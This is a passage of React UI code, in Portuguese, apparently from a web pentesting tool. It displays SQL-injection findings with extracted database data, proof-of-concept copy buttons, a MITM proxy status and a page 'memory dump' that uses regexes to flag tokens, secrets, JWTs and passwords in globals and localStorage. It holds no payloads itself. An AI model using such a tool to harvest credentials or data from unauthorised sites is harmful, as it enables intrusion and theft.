                                  <summary className="text-[10px] text-nova-accent cursor-pointer hover:text-nova-accent/80">Prova de Conceito</summary>
                                  <div className="relative group/poc mt-1">
                                    <pre className="bg-[#0a0f0d] p-2 rounded text-[10px] font-mono text-nova-text overflow-auto">{finding.poc}</pre>
                                    <button
                                      onClick={() => navigator.clipboard.writeText(finding.poc)}
                                      className="absolute top-1 right-1 opacity-0 group-hover/poc:opacity-100 px-2 py-0.5 bg-nova-accent/20 text-nova-accent rounded text-[9px] hover:bg-nova-accent/30 transition-opacity"
                                    >
                                      <Copy size={10} className="inline mr-1" />Copiar PoC
                                    </button>
                                  </div>
                                </details>
                                <details className="mt-1">
                                  <summary className="text-[10px] text-nova-text-secondary cursor-pointer hover:text-nova-text">Evidência</summary>
                                  <div className="relative group/ev mt-1">
                                    <pre className="bg-[#0a0f0d] p-2 rounded text-[10px] font-mono text-nova-text/70 overflow-auto">{finding.evidence}</pre>
                                    <button
                                      onClick={() => navigator.clipboard.writeText(finding.evidence)}
                                      className="absolute top-1 right-1 opacity-0 group-hover/ev:opacity-100 px-2 py-0.5 bg-nova-accent/20 text-nova-accent rounded text-[9px] hover:bg-nova-accent/30 transition-opacity"
                                    >
                                      <Copy size={10} className="inline mr-1" />Copiar Evidência
                                    </button>
                                  </div>
                                </details>
                                {finding.extractedData && (
                                  <div className="mt-3 border border-green-500/20 rounded-lg bg-green-500/5 p-3">
                                    <div className="flex items-center gap-2 mb-2">
                                      <Database size={14} className="text-green-400" />
                                      <span className="text-[11px] font-semibold text-green-400">Dados Extraídos do Banco</span>
                                      <button
                                        onClick={() => navigator.clipboard.writeText(finding.extractedData || '')}
                                        className="ml-auto px-2 py-0.5 bg-green-500/15 text-green-400 rounded text-[9px] hover:bg-green-500/25 transition-colors"
                                      >
                                        <Copy size={10} className="inline mr-1" />Copiar
                                      </button>
                                    </div>
                                    <pre className="bg-[#0a0f0d] border border-green-500/10 p-3 rounded text-[10px] font-mono text-green-300/90 overflow-auto max-h-[300px] whitespace-pre-wrap">{finding.extractedData}</pre>
                                    <p className="text-[9px] text-green-400/60 mt-1">Dados obtidos via UNION SELECT. As consultas podem ter extraído informações reais do banco de dados.</p>
                                  </div>
                                )}
                                {finding.manualTest && (
                                  <details className="mt-3" defaultChecked>
                                    <summary className="flex items-center gap-1 text-[11px] font-semibold text-orange-400 cursor-pointer hover:text-orange-300 transition-colors">
                                      <span>🧪</span>
                                      <span>Como testar manualmente esta falha</span>
                                    </summary>
                                    <div className="mt-2 border border-orange-500/20 rounded-lg bg-orange-500/5 p-3">
                                      {finding.manualTest.map((step, i) => (
                                        <div key={i} className={`text-[10px] leading-relaxed ${step.startsWith('   ') ? 'text-nova-text-muted pl-5 font-mono' : 'text-nova-text font-medium'}`}>
                                          {step}
                                        </div>
                                      ))}
                                      <div className="mt-3 flex items-center gap-2">
                                        <button
                                          onClick={() => navigator.clipboard.writeText(finding.manualTest!.join('\n'))}
                                          className="px-2.5 py-1 bg-orange-500/15 text-orange-400 rounded text-[9px] hover:bg-orange-500/25 transition-colors flex items-center gap-1"
                                        >
                                          <Copy size={10} />
                                          Copiar todos os passos
                                        </button>
                                      </div>
                                    </div>
                                  </details>
                                )}
                              </div>
                            </div>
                          </div>
                        ))
                    )}
                  </div>
                </section>
              </>
            )}

            {/* Aviso */}
            <section className="border border-yellow-500/20 rounded-lg bg-yellow-500/5 p-3">
              <p className="text-[10px] text-yellow-400/80">
                <strong>⚠️ Aviso Legal:</strong> Teste apenas sites que você possui autorização para testar.
                O uso não autorizado deste recurso pode violar leis locais e termos de serviço.
                Você é o único responsável pelo uso deste recurso.
              </p>
            </section>
          </div>
          )}
          </div>

          {/* Coluna Direita — Hacker Chat integrado */}
          <div className={`border-l flex-shrink-0 transition-all ${hackerMode ? 'w-[400px] border-red-500/20' : 'w-[340px] border-nova-border'}`}>
            <HackerChat targetUrl={currentUrl && currentUrl !== 'about:blank' ? currentUrl : ''} />
          </div>
        </div>

        {/* Memory Tab */}
        <div className={`${activeTab === 'memory' ? 'flex' : 'hidden'} flex-1 min-w-0 flex-col`}>
          <div className="h-10 px-3 border-b border-nova-border bg-nova-bg-secondary flex items-center gap-2 shrink-0">
            <Brain size={13} className="text-purple-400" />
            <span className="font-semibold">Dump de Memória do Site</span>
            <button
              onClick={captureWebsiteMemory}
              disabled={memoryCapturing || !currentUrl || currentUrl === 'about:blank'}
              className="ml-auto flex items-center gap-1 px-3 py-1 rounded bg-purple-500/15 text-purple-400 text-[10px] font-medium hover:bg-purple-500/25 disabled:opacity-40 disabled:cursor-not-allowed"
            >
              {memoryCapturing ? (
                <><RefreshCw size={11} className="animate-spin" /> Capturando...</>
              ) : (
                <><Database size={11} /> Capturar Memória</>
              )}
            </button>
            {websiteMemoryDump && (
              <button
                onClick={analyzeMemoryWithAI}
                className="flex items-center gap-1 px-3 py-1 rounded bg-purple-500/20 text-purple-300 border border-purple-500/30 text-[10px] font-medium hover:bg-purple-500/30"
              >
                <Brain size={11} /> Analisar com IA
              </button>
            )}
          </div>

          <div className="flex-1 overflow-auto scrollbar-thin p-4 space-y-4">
            {!websiteMemoryDump ? (
              <div className="flex items-center justify-center h-full text-nova-text-muted">
                <div className="text-center max-w-md">
                  <Database size={48} className="mx-auto mb-4 opacity-20" />
                  <p className="text-sm font-semibold text-nova-text mb-2">Dump de Memória do Website</p>
                  <p className="text-[10px] leading-relaxed mb-4">
                    Capture o estado completo da memória do site carregado no navegador:
                    DOM, variáveis JavaScript globais, localStorage, sessionStorage,
                    campos hidden, strings codificadas (Base64/JWT) e mais.
                  </p>
                  <p className="text-[11px] font-semibold text-nova-accent mb-3">A IA pode analisar e decifrar automaticamente!</p>
                  <button
                    onClick={captureWebsiteMemory}
                    disabled={memoryCapturing || !currentUrl || currentUrl === 'about:blank'}
                    className="px-4 py-2 rounded-lg bg-purple-500/20 text-purple-400 font-medium hover:bg-purple-500/30 disabled:opacity-40 disabled:cursor-not-allowed transition-colors flex items-center gap-2 mx-auto"
                  >
                    {memoryCapturing ? (
                      <><RefreshCw size={14} className="animate-spin" /> Capturando...</>
                    ) : (
                      <><Database size={14} /> Iniciar Captura</>
                    )}
                  </button>
                  {(!currentUrl || currentUrl === 'about:blank') && (
                    <p className="text-[9px] text-yellow-400 mt-2">Navegue até um site na aba "Navegador" primeiro</p>
                  )}
                </div>
              </div>
            ) : (() => {
              const dump = websiteMemoryDump
              const suspiciousGlobals = dump.globals.filter(g => /token|key|secret|auth|api|jwt|session|pass|cred|user/i.test(g.key))
              const suspiciousStorage = Object.entries(dump.localStorage).filter(([k]) => /token|key|secret|auth|jwt|session|pass/i.test(k))
              const interestingMeta = dump.meta.filter(m => /csrf|token|api|version|generator/i.test(m.name + m.content))

              return (
                <>
                  {/* Overview */}
                  <section className="border border-nova-border rounded-lg bg-nova-bg-secondary p-4">
                    <div className="flex items-center gap-2 mb-3">
                      <Globe size={14} className="text-purple-400" />
                      <h3 className="font-semibold text-nova-text truncate">{dump.title}</h3>
                      <span className="text-[10px] text-nova-text-muted ml-auto">{dump.capturedAt}</span>
                    </div>
                    <div className="grid grid-cols-3 md:grid-cols-6 gap-2">
                      <div className="bg-nova-bg rounded p-2 text-center">
                        <div className="text-lg font-bold text-purple-400">{dump.dom.tagCount}</div>
                        <div className="text-[9px] text-nova-text-muted">Elementos</div>
                      </div>
                      <div className="bg-nova-bg rounded p-2 text-center">
                        <div className="text-lg font-bold text-blue-400">{dump.dom.forms}</div>
                        <div className="text-[9px] text-nova-text-muted">Forms</div>
                      </div>
                      <div className="bg-nova-bg rounded p-2 text-center">
                        <div className="text-lg font-bold text-green-400">{dump.dom.links}</div>
                        <div className="text-[9px] text-nova-text-muted">Links</div>
                      </div>
                      <div className="bg-nova-bg rounded p-2 text-center">
                        <div className="text-lg font-bold text-yellow-400">{dump.dom.scripts}</div>
                        <div className="text-[9px] text-nova-text-muted">Scripts</div>
                      </div>
                      <div className="bg-nova-bg rounded p-2 text-center">
                        <div className="text-lg font-bold text-orange-400">{dump.encodedStrings.length}</div>
                        <div className="text-[9px] text-nova-text-muted">Codificados</div>
                      </div>
                      <div className="bg-nova-bg rounded p-2 text-center">
                        <div className="text-lg font-bold text-red-400">{dump.hiddenFields.length}</div>
                        <div className="text-[9px] text-nova-text-muted">Hidden</div>
                      </div>
                    </div>
                  </section>

                  {/* Suspicious Globals */}
                  {suspiciousGlobals.length > 0 && (
                    <section className="border border-red-500/20 rounded-lg bg-red-500/5 p-4">
                      <h3 className="font-semibold text-red-400 mb-3 flex items-center gap-2">
                        <Key size={14} />
                        Chaves Globais Suspeitas ({suspiciousGlobals.length})
                      </h3>
                      <div className="space-y-2">
                        {suspiciousGlobals.map((g, i) => (
                          <div key={i} className="bg-nova-bg rounded p-2 border border-red-500/10">
                            <span className="text-[10px] font-mono text-red-300">window.{g.key}</span>
                            <span className="text-[9px] text-nova-text-muted ml-2">({g.type})</span>
                            <pre className="mt-1 text-[10px] font-mono text-nova-text/80 break-all">{g.preview}</pre>
                          </div>
                        ))}
                      </div>
                    </section>
                  )}

                  {/* Encoded Strings */}
                  {dump.encodedStrings.length > 0 && (
                    <section className="border border-purple-500/20 rounded-lg bg-purple-500/5 p-4">
                      <h3 className="font-semibold text-purple-400 mb-3 flex items-center gap-2">
                        <FileKey size={14} />
                        Strings Codificadas/Decifradas ({dump.encodedStrings.length})
                      </h3>
                      <div className="space-y-3">
                        {dump.encodedStrings.map((e, i) => (
                          <div key={i} className="bg-nova-bg rounded p-2 border border-purple-500/10">
                            <div className="flex items-center gap-2 mb-1">
                              <span className="px-1.5 py-0.5 rounded text-[8px] font-bold bg-purple-500/20 text-purple-300">{e.encoding.toUpperCase()}</span>
                              <span className="text-[9px] text-nova-text-muted">#{i + 1}</span>
                              <button
                                onClick={() => navigator.clipboard.writeText(e.value)}
                                className="ml-auto text-nova-text-muted hover:text-nova-accent"
                              >
                                <Copy size={10} />
                              </button>
                            </div>
                            <p className="text-[10px] font-mono text-nova-text/80 break-all mb-2 bg-[#0a0f0d] p-2 rounded">
                              {e.value}
                            </p>
                            {e.decoded && (
                              <>
                                <p className="text-[9px] text-green-400 font-semibold mb-1">Decodificado:</p>
                                <pre className="text-[10px] font-mono text-green-300/80 bg-[#0a0f0d] p-2 rounded break-all max-h-[200px] overflow-auto whitespace-pre-wrap">
                                  {e.decoded}
                                </pre>
                              </>
                            )}
                          </div>
                        ))}
                      </div>
                    </section>
                  )}

                  {/* Hidden Fields */}
                  {dump.hiddenFields.length > 0 && (
                    <section className="border border-yellow-500/20 rounded-lg bg-yellow-500/5 p-4">
                      <h3 className="font-semibold text-yellow-400 mb-3 flex items-center gap-2">
                        <Eye size={14} />
                        Campos Hidden ({dump.hiddenFields.length})
                      </h3>
                      <div className="space-y-1">
                        {dump.hiddenFields.map((f, i) => (
                          <div key={i} className="bg-nova-bg rounded p-2 flex items-center gap-2">
                            <code className="text-[10px] font-mono text-yellow-300 flex-1">{f.name}</code>
                            <code className="text-[10px] font-mono text-nova-text/70 truncate max-w-[400px]">{f.value}</code>
                            <button onClick={() => navigator.clipboard.writeText(f.value)} className="text-nova-text-muted hover:text-nova-accent">
                              <Copy size={10} />
                            </button>
                          </div>
                        ))}
                      </div>
                    </section>
                  )}

                  {/* Forms */}
                  {dump.forms.length > 0 && (
                    <section className="border border-nova-border rounded-lg bg-nova-bg-secondary p-4">
                      <h3 className="font-semibold text-nova-text mb-3 flex items-center gap-2">
                        <Edit3 size={14} className="text-nova-accent" />
                        Formulários ({dump.forms.length})
                      </h3>
                      <div className="space-y-3">
                        {dump.forms.map((form, i) => (
                          <div key={i} className="bg-nova-bg rounded p-2 border border-nova-border">
                            <div className="flex items-center gap-2 mb-2">
                              <span className="text-[9px] font-bold text-nova-accent">{form.method}</span>
                              <code className="text-[10px] font-mono text-nova-text/70 truncate">{form.action || '(sem action)'}</code>
                              <span className="text-[9px] text-nova-text-muted ml-auto">{form.inputs.length} inputs</span>
                            </div>
                            <div className="grid grid-cols-2 gap-1">
                              {form.inputs.map((inp, j) => (
                                <div key={j} className="flex items-center gap-1 text-[9px]">
                                  <span className="text-nova-text-muted">{inp.type}:</span>
                                  <span className="font-mono text-nova-text">{inp.name || '(sem nome)'}</span>
                                  {inp.value && <span className="text-nova-text-muted">= {inp.value.slice(0, 30)}</span>}
                                </div>
                              ))}
                            </div>
                          </div>
                        ))}
                      </div>
                    </section>
                  )}

                  {/* Meta Tags */}
                  {interestingMeta.length > 0 && (
                    <section className="border border-nova-border rounded-lg bg-nova-bg-secondary p-4">
                      <h3 className="font-semibold text-nova-text mb-2">Meta Tags Relevantes</h3>
                      <div className="space-y-1">
                        {interestingMeta.map((m, i) => (
                          <div key={i} className="flex items-center gap-2 text-[10px]">
                            <span className="font-mono text-nova-accent">{m.name}</span>
                            <span className="font-mono text-nova-text/70">= {m.content.slice(0, 100)}</span>
                          </div>
                        ))}
                      </div>
                    </section>
                  )}

                  {/* All Globals (collapsible) */}
                  <details className="border border-nova-border rounded-lg bg-nova-bg-secondary">
                    <summary className="p-3 cursor-pointer font-semibold text-nova-text hover:text-nova-accent text-[11px]">
                      Todas as Variáveis Globais ({dump.globals.length})
                    </summary>
                    <div className="px-3 pb-3 max-h-[400px] overflow-auto">
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-1">
                        {dump.globals.map((g, i) => (
                          <div key={i} className="flex items-start gap-2 text-[9px] p-1 hover:bg-nova-hover rounded">
                            <span className="font-mono text-nova-accent shrink-0">{g.key}</span>
                            <span className="text-nova-text-muted">({g.type})</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  </details>

                  {/* Script Sources */}
                  <details className="border border-nova-border rounded-lg bg-nova-bg-secondary">
                    <summary className="p-3 cursor-pointer font-semibold text-nova-text hover:text-nova-accent text-[11px]">
                      Scripts Externos ({dump.scriptSrcs.length})
                    </summary>
                    <div className="px-3 pb-3">
                      {dump.scriptSrcs.map((src, i) => (
                        <div key={i} className="text-[9px] font-mono text-nova-text/60 truncate py-0.5">{src}</div>
                      ))}
                    </div>
                  </details>

                  {/* Actions */}
                  <div className="flex items-center gap-3 pt-2">
                    <button
                      onClick={analyzeMemoryWithAI}
                      className="flex-1 flex items-center justify-center gap-2 p-3 border border-purple-500/30 rounded-lg bg-purple-500/10 hover:bg-purple-500/20 text-purple-400 font-medium transition-colors"
                    >
                      <Brain size={16} />
                      Analisar com IA
                    </button>
                    <button
                      onClick={() => navigator.clipboard.writeText(JSON.stringify(dump, null, 2))}
                      className="flex items-center gap-2 px-4 py-3 border border-nova-border rounded-lg bg-nova-bg-secondary hover:bg-nova-hover text-nova-text-secondary font-medium transition-colors"
                    >
                      <Download size={14} />
                      Exportar JSON
                    </button>
                  </div>
                </>
              )
            })()}
          </div>
        </div>
      </div>

      <div className="h-8 shrink-0 border-t border-nova-border bg-nova-bg-secondary flex items-center gap-3 px-2 text-[10px] text-nova-text-muted">
        <span className="flex items-center gap-1"><span className={`w-1.5 h-1.5 rounded-full ${isMonitoring ? 'bg-nova-success animate-pulse' : 'bg-nova-text-muted'}`} /> Sessão isolada: {browserPartition}</span>
        <span className="flex items-center gap-1"><span className={`w-1.5 h-1.5 rounded-full ${isMitmRunning ? 'bg-nova-success animate-pulse' : 'bg-nova-text-muted'}`} /> MITM: {isMitmRunning ? `127.0.0.1:${mitmPort}` : 'desligado'}</span>
        {mitmCaPath && <span className="truncate max-w-[360px]" title={mitmCaPath}>CA: {mitmCaPath}</span>}
        <span>Proxy legado:</span>
        <input value={portInput} onChange={event => setPortInput(event.target.value)} disabled={isProxyRunning} className="w-14 bg-nova-input-bg border border-nova-input-border rounded px-1" />
        <button onClick={toggleProxy} className="flex items-center gap-1 hover:text-nova-text">
          {isProxyRunning ? <Square size={10} /> : <Play size={10} />} {isProxyRunning ? `localhost:${proxyPort}` : 'Iniciar proxy HTTP'}
        </button>
      </div>
    </div>
  )
}
